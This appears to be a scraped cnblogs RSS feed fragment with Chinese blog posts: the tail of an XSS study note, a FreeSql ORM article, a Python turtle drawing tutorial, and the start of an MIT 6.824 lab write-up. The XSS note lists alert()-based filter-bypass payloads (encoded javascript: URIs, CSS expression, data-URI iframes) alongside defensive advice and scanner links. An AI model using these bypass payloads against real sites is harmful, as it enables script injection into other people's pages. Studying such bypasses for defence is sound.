-&amp;lt;svg onload=alert(1)&amp;gt;
-iframe
-&amp;lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;——引自&lt;strong&gt;wkend&lt;/strong&gt;的文章&lt;a href=&quot;https://xz.aliyun.com/t/2936&quot;&gt;《XSS小节》&lt;/a&gt;&lt;/p&gt;
-&lt;h4 id=&quot;工具检测&quot;&gt;工具检测&lt;/h4&gt;
-&lt;p&gt;       关于XSS的自动检测软件有许多，如Burp的Scan模块，&lt;a href=&quot;https://github.com/rajeshmajumdar/BruteXSS&quot;&gt;BruteXSS&lt;/a&gt;等，这里不做过多解释。&lt;/p&gt;
-&lt;h2 id=&quot;shellcode的绕过&quot;&gt;6) shellcode的绕过&lt;/h2&gt;
-&lt;h3 id=&quot;绕过xss-filter&quot;&gt;绕过XSS-Filter&lt;/h3&gt;
-&lt;p&gt;       XSS-Filter是一段基于黑名单的过滤函数，大多数CMS都有这么个函数，作用于用户的每一个输入点，用于过滤可能的恶意代码。不过从某种意义上来说，基于黑名单的保护是一定不会是安全的，由于XSS的多变性，几乎不可能存在完全地过滤。&lt;/p&gt;
-&lt;h4 id=&quot;空格回车和tab&quot;&gt;空格回车和Tab&lt;/h4&gt;
-&lt;p&gt;       对XSS-Filter而言，如果仅仅是将函数加入黑名单处理，那么可以在函数名称之中尝试加入空格、回车、Tab等键位符来进行绕过。这是由于在javascript中只会将&lt;code&gt;;&lt;/code&gt;作为语句的终止符，当浏览器引擎解析javascript脚本时没有匹配到&lt;code&gt;;&lt;/code&gt;便会继续处理，知道发现下个分号为止，而换行符并不是终止符。如下列代码可绕过对关键字&lt;code&gt;javascript|alert&lt;/code&gt;的过滤：&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;&amp;lt;img src=javasc
-ript:aler
-t(/xss/)&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2019/03/10/5c83f56052a54.png&quot; alt=&quot;IE6下测试成功&quot;/&gt;&lt;/p&gt;
-&lt;h4 id=&quot;对标签属性值进行转码&quot;&gt;对标签属性值进行转码&lt;/h4&gt;
-&lt;p&gt;       HTML中属性值支持ASCII码形式，如&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;&amp;lt;img src=&quot;javascript:alert('xss');&quot;&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;       替换成&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;&amp;lt;img src=&quot;javascrip&amp;amp;#116&amp;amp;#58alert('xss');&quot;&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;       其中在ASCII表中116为&lt;code&gt;t&lt;/code&gt;，58为&lt;code&gt;:&lt;/code&gt;。&lt;br/&gt;       也可以将&lt;code&gt;&amp;amp;#01&lt;/code&gt;,&lt;code&gt;&amp;amp;#02&lt;/code&gt;等插入javascript的头部，还可以将tab(&amp;amp;#09)|换行符(&amp;amp;#10)|回车键(&amp;amp;#13)插入到代码中的任意位置。&lt;/p&gt;
-&lt;h4 id=&quot;fuzz标签未过滤事件名&quot;&gt;Fuzz标签未过滤事件名&lt;/h4&gt;
-&lt;p&gt;       如&lt;code&gt;&amp;lt;img src=x onerror=alert(/xss/)&amp;gt;&lt;/code&gt;其中的onerror即为IMG标签的一个事件，通常这样的事件都是以&lt;code&gt;on&lt;/code&gt;开头，常见的有:&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;onResume
-onReverse
-onSeek
-onSynchRestored
-onURLFlip
-onRepeat
-onPause
-onstop
-onmouseover&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;       除此之外还有很多事件可以利用，这里不再一一列举。&lt;/p&gt;
-&lt;h4 id=&quot;使用css绕过&quot;&gt;使用Css绕过&lt;/h4&gt;
-&lt;p&gt;       利用Css样式表可以执行javascript的特性，如&lt;br/&gt;       Css直接执行javascript：&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;&amp;lt;div style=&quot;background-image:url(javascript:alert('xss'))&quot;&amp;gt;
-&amp;lt;style&amp;gt;
-    body {background-image:url(&quot;javascript:alert('xss')&quot;);}
-&amp;lt;/style&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;       css中使用expression执行javascript:&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;&amp;lt;div style=&quot;width: expression(alert('xss'))&quot;&amp;gt;
-&amp;lt;img src=&quot;#&quot; style=&quot;xss:expression(alert(/xss/))&quot;&amp;gt;
-&amp;lt;style&amp;gt;
-    body {background-image:expression(&quot;alert('xss')&quot;);}
-&amp;lt;/style&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;       在上述的两个例子中，都用到了样式表的url属性来执行XSS代码。&lt;br/&gt;       除了上述两种，还可以利用@import直接执行javascript代码&lt;/p&gt;
-&lt;pre&gt;
-&lt;code&gt;&amp;lt;style&amp;gt;
-    @import 'javascript:alert(&quot;xss&quot;)';
-&amp;lt;/style&amp;gt;&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;       在现实环境下，HTML页面中的Css与Javascript的嵌入方式很相似，且Css也可以执行javascript代码，故我们的XSS代码也可以通过嵌入远程恶意css文件来进行XSS攻击。&lt;/p&gt;
-&lt;h3 id=&quot;扰乱规则&quot;&gt;扰乱规则&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;大小写变换;&lt;/li&gt;
-&lt;li&gt;利用expression执行跨站代码的时候，可以构造不同的全角字符来扰乱过滤规则;&lt;/li&gt;
-&lt;li&gt;结合样式表注释字符/**/，通过css执行javascript&lt;/li&gt;
-&lt;li&gt;样式标签会过滤&lt;code&gt;\&lt;/code&gt;和&lt;code&gt;\0&lt;/code&gt;，可以构造如&lt;code&gt;@i\mp\0\0ort 'jav\0asc\0rip\t:al\0er\t(&quot;x\0ss&quot;)'&lt;/code&gt;绕过&lt;/li&gt;
-&lt;li&gt;Css关键字进行编码处理，如&lt;code&gt;&amp;lt;p style=&quot;xss:\0065xpression(alert(/xss/))&quot;&amp;gt;&lt;/code&gt;其中65为字母e进行unicode编码后的数字部分&lt;/li&gt;
-&lt;li&gt;利用浏览器解析注释的问题&lt;/li&gt;
-&lt;/ul&gt;&lt;h3 id=&quot;利用字符编码&quot;&gt;利用字符编码&lt;/h3&gt;
-&lt;p&gt;       javascript支持许多的编码格式，如：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;unicode&lt;/li&gt;
-&lt;li&gt;escapes&lt;/li&gt;
-&lt;li&gt;十六|十|八进制&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;如果能将这些编码格式运用进跨站攻击，无意能大大加强XSS的威力&lt;/strong&gt;&lt;br/&gt;在IE下甚至支持JScript Encode加密后的代码&lt;/p&gt;
-&lt;h3 id=&quot;拆分法&quot;&gt;拆分法&lt;/h3&gt;
-&lt;p&gt;       如果一个网站规定了输入的最大长度，但是ShellCode又太长，那么久可以拆分成几个部分，最后在组成起来。相关文章：&lt;a href=&quot;http://www.5ilog.com/cgi-bin/sys/link/view.aspx/7016111.htm&quot;&gt;《疯狂的跨站之行》剑心(非原链接)&lt;/a&gt;&lt;/p&gt;
-&lt;h2 id=&quot;xss防御&quot;&gt;7) XSS防御&lt;/h2&gt;
-&lt;p&gt;       说了那么多，那我们该如何防御这看似防不胜防的XSS攻击呢？&lt;/p&gt;
-&lt;h3 id=&quot;输入&quot;&gt;输入&lt;/h3&gt;
-&lt;p&gt;       严格控制用户可输入的范围，如手机号只能输入数字且长度不能大于11位等，如需输入某些敏感字符的情况下可对数据进行转义处理，对于用户数据的过滤尽可能地采用白名单而不是黑名单。&lt;/p&gt;
-&lt;h3 id=&quot;输出&quot;&gt;输出&lt;/h3&gt;
-&lt;p&gt;       减少不必要的输出，在需要输出的地方使用HTML编码将敏感字符转义为实体符，javascript进行DOM操作时注意不要将已转义的实体符再次解析成DOM对象。&lt;/p&gt;
-&lt;h3 id=&quot;其他&quot;&gt;其他&lt;/h3&gt;
-&lt;p&gt;       设置HttpOnly，开启WAF。&lt;/p&gt;
-
-&lt;p&gt;       感谢参考资料中各位分享技术的大牛，小弟才笔有限，仅仅介绍了XSS攻击中的一部分，仍有一部分由于种种原因我没有写进来。比如整篇文章都是Javascript，实际上在遇到XSS问题时我们还需考虑VBscript、Actionscript等等，还有许多优秀的案例由于篇幅问题无法写上了，可能会导致部分读者理解不全面，在这里向大家说声抱歉，我会在下面的参考中列出我参考的书籍与文章供各位读者查看。XSS的学习暂时放下了，下一站——SQL注入，虽然对此有些浅显的认知，但还是希望能系统的学一遍，可能会在下个月发出来，感兴趣的读者可以关注&lt;a href=&quot;http://www.cnblogs.com/yunen/p/www.0x002.com&quot;&gt;我的博客&lt;/a&gt;。&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;&lt;br/&gt;书籍：&lt;br/&gt;《Web前端黑客技术揭秘》&lt;br/&gt;《XSS跨站脚本攻击剖析与防御》&lt;br/&gt;《白帽子讲Web安全》&lt;br/&gt;《黑客攻防技术宝典Web实战篇》第二版&lt;br/&gt;文章：&lt;/strong&gt;&lt;br/&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2936&quot;&gt;XSS小结&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://github.com/dwqs/blog/issues/68&quot;&gt;浅说 XSS 和 CSRF&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://blog.csdn.net/h_mxc/article/details/50542038&quot;&gt;Session攻击手段(会话劫持/固定)及其安全防御措施&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;https://github.com/ChrisLinn/greyhame-2017/blob/master/skills/web.md 2017灰袍技能精华&lt;br/&gt;https://github.com/rajeshmajumdar/BruteXSS BruteXSS&lt;br/&gt;https://github.com/beefproject/beef Beef神器&lt;br/&gt;https://github.com/1N3/XSSTracer 用于检查跨站点跟踪的小型python脚本&lt;br/&gt;https://github.com/0x584A/fuzzXssPHP 一个非常简单的反射XSS扫描仪支持GET/POST&lt;br/&gt;https://github.com/chuhades/xss_scan 反射xss扫描器&lt;br/&gt;https://github.com/BlackHole1/autoFindXssAndCsrf 浏览器的插件，它自动检查页面是否具有xss和漏洞&lt;br/&gt;https://github.com/shogunlab/shuriken xss命令行工具用于测试web应用程序中xss负载列表&lt;br/&gt;https://github.com/UltimateHackers/XSStrike 用于XSS、WAF检测和旁路的模糊和蛮力参数&lt;br/&gt;https://github.com/stamparm/DSXS 一个完全功能的跨站点脚本漏洞扫描器，支持获取和发布参数，并写入100行代码&lt;/p&gt;
-</description>
-<pubDate>Fri, 22 Mar 2019 14:05:00 +0000</pubDate>
-<dc:creator>Yunen的博客</dc:creator>
-<og:description>简单概述 &amp; 160; &amp; 160; &amp; 160; &amp; 160;此篇系本人两周来学习XSS的一份个人总结，实质上应该是一份笔记，方便自己日后重新回来复习，文中涉及到的文章我都会在末尾尽可能地添加上，此</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/yunen/p/10581320.html</dc:identifier>
-</item>
-<item>
-<title>跟踪测试 DbContext ，向＂不是真正的 ORM＂ 说拜拜 - nicye</title>
-<link>http://www.cnblogs.com/kellynic/p/10580936.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/kellynic/p/10580936.html</guid>
-<description>&lt;p&gt;FreeSql 发展到现在，已经有两种稳定的开发模式，以下先简单带过一下。后面才是本文的主题。&lt;/p&gt;
-&lt;h2 id=&quot;方法一基于-helper-的方式祼用&quot;&gt;方法一：基于 helper 的方式，祼用；&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;dotnet add package FreeSql&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;提供 CodeFirst、DbFirst、丰富的表达式树、读写分离、AOP等功能支持；&lt;/p&gt;
-&lt;h2 id=&quot;方法二基于-repository-unitofwok-的方式&quot;&gt;方法二：基于 Repository + UnitOfWok 的方式；&lt;/h2&gt;
-&lt;blockquote readability=&quot;5&quot;&gt;
-&lt;p&gt;dotnet add package FreeSql.Repository&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;这是一个扩展包，提供标准的 IRepository 接口定义与默认实现，以及 UnitOfWork 工作单元的支持，更可怕的是集成了局部/全局过滤器，实现租户、软删除等功能不在话下。&lt;/p&gt;
-&lt;p&gt;不相信吗？请看以下代码：&lt;/p&gt;
-&lt;pre class=&quot;csharp&quot;&gt;
-&lt;code&gt;public IServiceProvider ConfigureServices(IServiceCollection services) {
-    services.AddSingleton&amp;lt;IFreeSql&amp;gt;(fsql);
-    services.AddMvc();
-
-    var builder = new ContainerBuilder();
-
-    builder.RegisterFreeRepository(filter =&amp;gt; filter
-        .Apply&amp;lt;ISoftDelete&amp;gt;(&quot;SoftDelete&quot;, a =&amp;gt; a.IsDeleted == false)
-        .Apply&amp;lt;ITenant&amp;gt;(&quot;Tenant&quot;, a =&amp;gt; a.TenantId == 1)
-    );
-
-    builder.Populate(services);
-    var container = builder.Build();
-    return new AutofacServiceProvider(container);
-}&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;比 abpvnext 还要方便，因为 abp 的相关实体需要实现接口 ISoftDelete、ITenant；&lt;/p&gt;
-&lt;p&gt;我们没有这个限制，只要过滤器的表达式解析成功，就算可用；&lt;/p&gt;
-&lt;p&gt;使用在任何实体上的时候，只要 [实体].IsDeleted == false 能解析能过，就算可用；&lt;/p&gt;
-
-&lt;p&gt;这个项目仍然是一个扩展包，提类似 EFCore 那样的开发习惯。目前定义的规则如下：&lt;/p&gt;
-&lt;blockquote readability=&quot;6&quot;&gt;
-&lt;p&gt;文字规则略显复杂，后边有代码演示，以及图文介绍在 sqlite 和 sqlserver 下的测试过程。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;h3 id=&quot;dbcontext&quot;&gt;DbContext&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;提供 SaveChanges 方法；&lt;/li&gt;
-&lt;li&gt;执行队列；&lt;/li&gt;
-&lt;/ul&gt;&lt;h3 id=&quot;dbset&quot;&gt;DbSet&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;提供 Add、AddRange、Remove、RemoveRange、Update、UpdateRange 方法；&lt;/li&gt;
-&lt;li&gt;以及 Select 属性（连去原有的 FreeSql 查询对象）；&lt;/li&gt;
-&lt;li&gt;私有对象 states，存储实体的副本哈希集合，key=实体的主键值，value=实体；&lt;/li&gt;
-&lt;/ul&gt;&lt;h3 id=&quot;addaddrangeentitys&quot;&gt;Add/AddRange(entitys)&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，是否存在于 states 中，存在时报错；&lt;/li&gt;
-&lt;li&gt;验证 entitys 主键中存在自增：
-&lt;ul&gt;&lt;li&gt;若有，则立即开启 DbContext 事务，按数据库种类执行相应的方法，最终将返回的自增值，赋给entitys的属性；&lt;/li&gt;
-&lt;li&gt;若无，并且 entitys 无主键值，则报错；&lt;/li&gt;
-&lt;li&gt;否则，进入【打包执行队列】；&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;li&gt;完成时更新 states；&lt;/li&gt;
-&lt;/ul&gt;&lt;h3 id=&quot;removeremoverangeentitys&quot;&gt;Remove/RemoveRange(entitys)&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，若无则报错；&lt;/li&gt;
-&lt;li&gt;验证 states 中是否存在，若无则提醒应该先查询，再删除；&lt;/li&gt;
-&lt;li&gt;删除 states 对应的实体；&lt;/li&gt;
-&lt;li&gt;清除 entitys 内的自增属性值、Guid 类型的值，那这个 entitys 将变为可 Add 状态；&lt;/li&gt;
-&lt;li&gt;进入【打包执行队列】；&lt;/li&gt;
-&lt;/ul&gt;&lt;h3 id=&quot;updateupdaterangeentitys&quot;&gt;Update/UpdateRange(entitys)&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;验证 entitys 主键值，若无则报错；&lt;/li&gt;
-&lt;li&gt;验证 states 中是否存在，若无则提醒应该先查询，再删除；&lt;/li&gt;
-&lt;li&gt;进入【打包执行队列】；&lt;/li&gt;
-&lt;/ul&gt;&lt;h3 id=&quot;select&quot;&gt;Select&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;立即执行队列中的命令（打包方式），以免脏读到未提交的数据；&lt;/li&gt;
-&lt;li&gt;查询完成时，更新 states 的值；&lt;/li&gt;
-&lt;/ul&gt;&lt;h3 id=&quot;更新数据规则&quot;&gt;更新数据规则&lt;/h3&gt;
-&lt;ul&gt;&lt;li&gt;对比 states 中存在的历史快照值，返回即将修改的 fields；&lt;/li&gt;
-&lt;/ul&gt;
-&lt;pre class=&quot;csharp&quot;&gt;
-&lt;code&gt;using FreeSql;
-
-public class SongContext : DbContext {
-
-    public DbSet&amp;lt;Song&amp;gt; Songs { get; set; }
-    public DbSet&amp;lt;Tag&amp;gt; Tags { get; set; }
-
-    protected override void OnConfiguring(DbContextOptionsBuilder builder) {
-        builder.UseFreeSql(这里是IFreeeSql对象);
-    }
-}
-
-public class Song {
-    [Column(IsIdentity = true)]
-    public int Id { get; set; }
-    public DateTime? Create_time { get; set; }
-    public bool? Is_deleted { get; set; }
-    public string Title { get; set; }
-    public string Url { get; set; }
-}
-public class Tag {
-    [Column(IsIdentity = true)]
-    public int Id { get; set; }
-    public string Name { get; set; }
-}
-
-using (var ctx = new SongContext()) {
-
-    ctx.Songs.Select.Where(a =&amp;gt; a.Id &amp;gt; 10).ToList();
-    //查询结果，存入 states
-
-    var song = new Song { };
-    //可插入的 song
-
-    ctx.Songs.Add(song);
-    id = song.Id;
-    //因有自增类型，立即开启事务执行SQL，返回自增值
-
-    var adds = Enumerable.Range(0, 100)
-        .Select(a =&amp;gt; new Song { Create_time = DateTime.Now, Is_deleted = false, Title = &quot;xxxx&quot; + a, Url = &quot;url222&quot; })
-        .ToList();
-    //创建一堆无主键值的数据
-
-    ctx.Songs.AddRange(adds);
-    //立即执行，将自增值赋给 adds 所有元素，因为有自增类型，如果其他类型，指定传入主键值，不会立即执行
-
-    for (var a = 0; a &amp;lt; adds.Count; a++)
-        adds[a].Title = &quot;dkdkdkdk&quot; + a;
-
-    ctx.Songs.UpdateRange(adds);
-    //批量修改，进入队列
-
-    ctx.Songs.RemoveRange(adds.Skip(10).Take(20).ToList());
-    //批量删除，进入队列，完成时 10-20 元素的主键值会被清除
-
-    //ctx.Songs.Update(adds.First());
-
-    adds.Last().Url = &quot;skldfjlksdjglkjjcccc&quot;;
-    ctx.Songs.Update(adds.Last());
-    //单条修改 urls 的值，进入队列
-
-    //throw new Exception(&quot;回滚&quot;);
-
-    //ctx.Songs.Select.First();
-    //这里做一个查询，会立即打包【执行队列】，避免没有提交的数据，影响查询结果
-
-    ctx.SaveChanges();
-    //打包【执行队列】，提交事务
-}&lt;/code&gt;
-&lt;/pre&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202503725-1998910232.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202625566-1608088349.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322202901970-1702592454.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;打个岔：为什么一条条的执行？&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;有自增属性需要获取值；&lt;/li&gt;
-&lt;li&gt;sqlite 没有批量插入获取多个自增的办法，或者您有招来支一支(万分感谢)；&lt;/li&gt;
-&lt;li&gt;后面采用 sqlserver 测试，就不是这个境况了，insert into values(),(),()，然后利用 output 特性返回所有值；
-&lt;ul&gt;&lt;li&gt;比较蛋疼的是，这个特性不是所有数据库都有&lt;/li&gt;
-&lt;/ul&gt;&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322203314837-1972352220.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322203514389-958794814.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;可以看见，最终 SaveChanges 时将不会产生影响的命令，一起打包执行，即采用优化合并的方式进行执行。&lt;/p&gt;
-&lt;p&gt;例如：&lt;/p&gt;
-&lt;pre class=&quot;csharp&quot;&gt;
-&lt;code&gt;ctx.Songs.Update(adds[0]);
-ctx.Songs.Update(adds[1]);&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;这两个更新操作，会合成一条 SQL 命令执行。&lt;/p&gt;
-
-&lt;p&gt;其实大致与 sqlite 下相同，唯一的区别在于 AddRange 的处理方式，如图：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/31407/201903/31407-20190322204114268-1554751503.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;当插入单条时，采用了第一行代码的 SQL 命令；&lt;/p&gt;
-&lt;p&gt;当批量插入时，采用了后面看上去复杂的 SQL 命令；&lt;/p&gt;
-&lt;p&gt;所有传入的实体属性值在执行完成后，都会更新；&lt;/p&gt;
-&lt;h2 id=&quot;特别说明&quot;&gt;特别说明&lt;/h2&gt;
-&lt;p&gt;FreeSql.DbContext 目前仍处于研究开发阶段，不适合商用；&lt;/p&gt;
-
-&lt;p&gt;为什么写这篇文章，时常看见有人说某某 orm 不是真正的 orm，没有 OO 思想。&lt;/p&gt;
-&lt;p&gt;希望 FreeSql.DbContext 随着时间的积累，稳定性和成熟度有所提升，不久成为一个真正的 ORM。&lt;/p&gt;
-&lt;p&gt;有人会担心，我们第三方做的不靠谱，没有 EFCore 稳定的说话，这个是当然。&lt;/p&gt;
-&lt;p&gt;但是我们也有自己的特点，不是吗？我们可以做到多种数据库使用习惯的一致性，这点 EFCore 目前是没有办法解决的难题。&lt;/p&gt;
-&lt;p&gt;从细节出发，我们的口号是：做 .NETCore 最方便的 ORM！&lt;/p&gt;
-&lt;p&gt;github: &lt;a href=&quot;https://github.com/2881099/FreeSql&quot; class=&quot;uri&quot;&gt;https://github.com/2881099/FreeSql&lt;/a&gt; 377星&lt;/p&gt;
-&lt;p&gt;还请献上宝贵的一星，谢谢观看！！&lt;/p&gt;
-</description>
-<pubDate>Fri, 22 Mar 2019 13:02:00 +0000</pubDate>
-<dc:creator>nicye</dc:creator>
-<og:description>FreeSql 发展到现在，已经有两种稳定的开发模式，以下先简单带过一下。后面才是本文的主题。 方法一：基于 helper 的方式，祼用； dotnet add package FreeSql 提供</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/kellynic/p/10580936.html</dc:identifier>
-</item>
-<item>
-<title>Python入门必学，用Python练习画个美队盾牌 - 上海小胖</title>
-<link>http://www.cnblogs.com/moonhmily/p/10580824.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/moonhmily/p/10580824.html</guid>
-<description>&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190322202431995.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTIzNjU4Mjg=,size_16,color_FFFFFF,t_70&quot; alt=&quot;美队盾牌&quot;/&gt;&lt;/p&gt;
-
-&lt;p&gt;Python版本：3.6.6&lt;/p&gt;
-&lt;p&gt;操作系统：Mac OS Mojave 10.14.2&lt;/p&gt;
-
-&lt;p&gt;最近我媳妇每天晚上吃饭时候也拿手机看，上厕所也在看。&lt;/p&gt;
-&lt;p&gt;看着看着还会笑？WTF？你在干嘛呢？&lt;/p&gt;
-&lt;p&gt;没错，她在看美队……&lt;/p&gt;
-&lt;p&gt;这男人比我帅？……&lt;/p&gt;
-&lt;p&gt;比我有钱？……&lt;/p&gt;
-&lt;p&gt;还是比我有腔调？……&lt;/p&gt;
-&lt;p&gt;答案很明显，我相信你们的眼睛都是雪亮的。&lt;/p&gt;
-&lt;p&gt;那问题来了，作为一个男人，怎么能忍？虽然是个明星，虽然是假的，虽然已经挽回不了败局了……那我就送个美队的盾牌给你吧……&lt;/p&gt;
-&lt;p&gt;这篇文章不是Turtle的入门篇，所以关于基本的画笔使用小胖不在这篇里赘述了。有兴趣的可以留言，我会根据你们的反馈来写一篇或者一个系列。&lt;/p&gt;
-
-&lt;p&gt;先来看一个效果图：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/20190322200514458.gif&quot; alt=&quot;美队盾牌&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;用过Turtle的都知道，画笔是需要抬手和落笔的。这一点一定要理解，因为计算机是很死板的，你的每一个动作都必须告诉他，包括GC。&lt;/p&gt;
-&lt;p&gt;所以你的画笔一旦落下，经过的每一处都会留下字迹。如果希望隔开一段距离就需要经过「抬笔」-&amp;gt;「移动画笔」-&amp;gt;「落笔」。&lt;/p&gt;
-&lt;p&gt;所以我们先把这个动作封装成一个函数：&lt;/p&gt;
-&lt;pre class=&quot;python&quot;&gt;
-&lt;code&gt;def setpen(x, y):
-    # 抬笔
-    t.penup()
-    # 移动画笔到(x, y)
-    t.goto(x, y)
-    # 落笔
-    t.pendown()
-    t.setheading(0)&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;接下来就来画盾牌。盾牌的话，注意观察美队盾牌，颜色是「红」-&amp;gt;「白」-&amp;gt;「红」-&amp;gt;「蓝」。&lt;/p&gt;
-&lt;p&gt;这里有一个技巧，就是后面填充的圆圈背景色是可以覆盖之前画的圆圈的背景色。&lt;/p&gt;
-&lt;pre class=&quot;python&quot;&gt;
-&lt;code&gt;def circle(x, y, r, color):
-    # 为了保证画出的圆够圆，所以我们把圆的边设置的多一些
-    n = 36
-    angle = 360 / n
-    pi = 3.1415926
-    # 周长
-    c = 2 * pi * r
-    # 每条边的长度
-    l = c / n
-    # 起始位置
-    start_x = x - l / 2
-    start_y = y + r
-    # 移动画笔
-    setpen(start_x, start_y)
-    # 选择画笔颜色
-    t.pencolor(color)
-    # 选择背景色
-    t.fillcolor(color)
-    # 填充
-    t.begin_fill()
-    for i in range(n):
-        t.forward(l)
-        t.right(angle)
-    t.end_fill()&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;接下来就是画里面那个白色的五角星了，这里就不注释了，因为和画圈的过程差不多。&lt;/p&gt;
-&lt;pre class=&quot;python&quot;&gt;
-&lt;code&gt;def five_star(l):
-    setpen(0, 0)
-    t.setheading(162)
-    t.forward(150)
-    t.setheading(0)
-    t.fillcolor('WhiteSmoke')
-    t.begin_fill()
-    t.hideturtle()
-    t.penup()
-    for i in range(5):
-        t.forward(l)
-        t.right(144)
-    t.end_fill()&lt;/code&gt;
-&lt;/pre&gt;
-&lt;p&gt;主函数：&lt;/p&gt;
-&lt;pre class=&quot;python&quot;&gt;
-&lt;code&gt;def sheild():
-    circle(0, 0, 300, 'red')
-    circle(0, 0, 250, 'white')
-    circle(0, 0, 200, 'red')
-    circle(0, 0, 150, 'blue')
-    five_star(284)
-
-if __name__ == '__main__':
-    sheild()
-    # 结束乌龟图
-    turtle.done()&lt;/code&gt;
-&lt;/pre&gt;
-
-&lt;p&gt;这是一篇用Python画画的文章，更多有趣、好玩的Python应用、实战尽在知识星球「人人都是Pythonista」。&lt;/p&gt;
-&lt;p&gt;关注公众号「&lt;strong&gt;Python专栏&lt;/strong&gt;」，回复：&lt;strong&gt;美队盾牌&lt;/strong&gt;，获取全套代码！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/649191/201902/649191-20190228222044609-1976101388.jpg&quot; width=&quot;300&quot; height=&quot;300&quot; alt=&quot;Python专栏二维码&quot;/&gt;&lt;/p&gt;
-</description>
-<pubDate>Fri, 22 Mar 2019 12:35:00 +0000</pubDate>
-<dc:creator>上海小胖</dc:creator>
-<og:description>这是一篇用Python画画的文章，更多有趣、好玩的Python应用、实战尽在知识星球「人人都是Pythonista」。 关注公众号「**Python专栏**」，回复：**美队盾牌**，获取全套代</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/moonhmily/p/10580824.html</dc:identifier>
-</item>
-<item>
-<title>MIT-6.824 Lab 3: Fault-tolerant Key/Value Service - gatsby123</title>
-<link>http://www.cnblogs.com/gatsby123/p/10580757.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/gatsby123/p/10580757.html</guid>
-<description>&lt;p&gt;lab2中实现了raft协议，本lab将在raft之上实现一个可容错的k/v存储服务，第一部分是实现一个不带日志压缩的版本，第二部分是实现日志压缩。时间原因我只完成了第一部分。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://blog-1253119293.cos.ap-beijing.myqcloud.com/6.824/lab3-KVServer/kvserver.png&quot; alt=&quot;kvserver&quot;/&gt;&lt;/p&gt;
